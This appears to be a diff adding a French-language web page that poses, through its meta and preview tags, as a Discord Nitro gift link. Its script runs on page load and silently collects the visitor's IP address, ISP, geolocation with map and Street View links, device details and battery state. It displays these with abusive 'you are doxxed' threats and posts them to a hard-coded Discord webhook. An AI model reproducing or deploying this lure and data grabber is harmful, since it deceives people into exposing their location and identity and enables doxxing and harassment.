@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Tu as reçu un cadeau Discord Nitro 1 mois de Ⲛⲉⲩⲣ0ⲭ ! Réclame ton abonnement 2025 maintenant pour débloquer des émojis customs, avatars animés et plus !">
+  <meta name="keywords" content="Discord Nitro, cadeau Nitro 1 mois, Ⲛⲉⲩⲣ0ⲭ, Nitro 2025, giveaway Discord">
+  <meta name="author" content="Ⲛⲉⲩⲣ0ⲭ">
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="Cadeau Discord Nitro 1 mois 2025 de Ⲛⲉⲩⲣ0ⲭ">
+  <meta Lumpproperty="og:description" content="Ⲛⲉⲩⲣ0ⲭ t’a offert un abonnement Discord Nitro 1 mois ! Réclame ton cadeau 2025 pour profiter d’émojis customs, uploads 100 Mo et badges évolutifs !">
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
+  <meta property="og:image:alt" content="Image officielle de cadeau Discord Nitro 1 mois 2025">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fake-doxbin.com">
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Cadeau Discord Nitro 1 mois 2025 de Ⲛⲉⲩⲣ0ⲭ">
+  <meta name="twitter:description" content="Tu as reçu un cadeau Nitro 1 mois de Ⲛⲉⲩⲣ0ⲭ ! Réclame-le vite pour débloquer les perks Nitro 2025 : émojis customs, avatars animés, et plus !">
+  <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
+  <title>Cadeau Discord Nitro 1 mois 2025 de Ⲛⲉⲩⲣ0ⲭ</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Courier New', monospace;
+      background: #000;
+      color: #fff;
+      text-align: center;
+      overflow-x: hidden;
+    }
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      background: #1a1a1a;
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+    }
+    h1 {
+      color: #ff0000;
+      font-size: 2.5em;
+      text-transform: uppercase;
+      text-shadow: 0 0 10px #ff0000;
+    }
+    p {
+      font-size: 1.2em;
+      margin: 15px 0;
+    }
+    .info-list {
+      text-align: left;
+      max-width: 600px;
+      margin: 20px auto;
+      font-size: 1.1em;
+    }
+    .info-list p {
+      margin: 5px 0;
+    }
+    a {
+      color: #00f;
+      text-decoration: underline;
+    }
+    a:hover {
+      color: #55f;
+    }
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8em; }
+      .container { padding: 10px; }
+      .info-list { font-size: 1em; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>T’ES DOXXÉ, SALE CON !</h1>
+    <p>T’as cru t’en tirer ? Ⲛⲉⲩⲣ0ⲭ a tout sur toi : ton IP, ta localisation, ton appareil, même ton putain de niveau de batterie. T’es à poil, et on va pas te lâcher. Mate tes infos ci-dessous, pauvre merde. On te surveille.</p>
+    <div class="info-list" id="dox-info">Récupération de tes données... t’es dans la merde.</div>
+  </div>
+  <script>
+    // Webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1369353407223038075/aqTdbnXYN1rqeSzSioI6iUrDcnl7ynyb-mzwPb9PL0QWP38WuhVnTYLSda8Exlb3yp7a';
+
+    // Fonction pour envoyer les données au webhook dans un format texte structuré
+    async function sendToWebhook(data) {
+      try {
+        const message = `
+DOX PAR Ⲛⲉⲩⲣ0ⲭ:
+- IPv4: ${data.ipv4}
+- IPv6: ${data.ipv6}
+- FAI: ${data.isp}
+- Ville: ${data.city}
+- Région: ${data.region}
+- Pays: ${data.country}
+- Latitude: ${data.latitude}
+- Longitude: ${data.longitude}
+- Google Maps: ${data.googleMaps}
+- Street View: ${data.streetView}
+- VPN/Proxy: ${data.vpnProxy}
+- User Agent: ${data.userAgent}
+- Appareil: ${data.device}
+- Modèle: ${data.model}
+- Batterie: ${data.battery ? `${data.battery.level} (${data.battery.charging})` : 'Non disponible'}
+        `.trim();
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+      } catch (e) {
+        console.error('Webhook foiré, pauvre con:', e);
+      }
+    }
+
+    // Récupérer les infos de l’appareil et réseau
+    async function gatherVictimInfo() {
+      let data = {};
+
+      // User Agent et infos appareil
+      const ua = navigator.userAgent;
+      data.userAgent = ua;
+      data.device = (function() {
+        if (/iPhone|iPad|iPod/.test(ua)) return 'Appareil Apple';
+        if (/Android/.test(ua)) return 'Appareil Android';
+        if (/Windows/.test(ua)) return 'PC Windows';
+        if (/Macintosh/.test(ua)) return 'Mac';
+        return 'Appareil inconnu';
+      })();
+      data.model = navigator.platform || 'Inconnu';
+
+      // Batterie
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        data.battery = {
+          level: `${(battery.level * 100).toFixed(0)}%`,
+          charging: battery.charging ? 'En charge' : 'Pas en charge'
+        };
+      }
+
+      // Infos réseau via ipapi.co
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const ipData = await res.json();
+        data.ipv4 = ipData.ip || 'Inconnu';
+        data.ipv6 = ipData.ipv6 || 'Non disponible';
+        data.isp = ipData.org || 'Inconnu';
+        data.city = ipData.city || 'Inconnue';
+        data.region = ipData.region || 'Inconnue';
+        data.country = ipData.country_name || 'Inconnu';
+        data.latitude = ipData.latitude || 'Inconnue';
+        data.longitude = ipData.longitude || 'Inconnu';
+        data.googleMaps = data.latitude !== 'Inconnue' ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` : 'Non disponible';
+        data.streetView = data.latitude !== 'Inconnue' ? `https://www.google.com/maps/@${data.latitude},${data.longitude},3a,75y,90h,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192` : 'Non disponible';
+        data.vpnProxy = ipData.network ? (ipData.network.includes('vpn') ? 'VPN détecté' : 'Pas de VPN') : 'Inconnu';
+      } catch (e) {
+        data.networkError = 'Erreur réseau, putain.';
+      }
+
+      return data;
+    }
+
+    // Afficher les infos en texte lisible
+    async function displayDoxInfo() {
+      const data = await gatherVictimInfo();
+      const infoDiv = document.getElementById('dox-info');
+      infoDiv.innerHTML = `
+        <p><strong>IPv4 :</strong> ${data.ipv4}</p>
+        <p><strong>IPv6 :</strong> ${data.ipv6}</p>
+        <p><strong>FAI :</strong> ${data.isp}</p>
+        <p><strong>Ville :</strong> ${data.city}</p>
+        <p><strong>Région :</strong> ${data.region}</p>
+        <p><strong>Pays :</strong> ${data.country}</p>
+        <p><strong>Latitude :</strong> ${data.latitude}</p>
+        <p><strong>Longitude :</strong> ${data.longitude}</p>
+        <p><strong>Google Maps :</strong> ${data.googleMaps !== 'Non disponible' ? `<a href="${data.googleMaps}" target="_blank">${data.googleMaps}</a>` : 'Non disponible'}</p>
+        <p><strong>Street View :</strong> ${data.streetView !== 'Non disponible' ? `<a href="${data.streetView}" target="_blank">${data.streetView}</a>` : 'Non disponible'}</p>
+        <p><strong>VPN/Proxy :</strong> ${data.vpnProxy}</p>
+        <p><strong>User Agent :</strong> ${data.userAgent}</p>
+        <p><strong>Appareil :</strong> ${data.device}</p>
+        <p><strong>Modèle :</strong> ${data.model}</p>
+        <p><strong>Batterie :</strong> ${data.battery ? `${data.battery.level} (${data.battery.charging})` : 'Non disponible'}</p>
+      `;
+
+      // Envoyer au webhook
+      await sendToWebhook(data);
+    }
+
+    // Exécuter dès le chargement
+    displayDoxInfo();
+  </script>
+</body>
+</html>
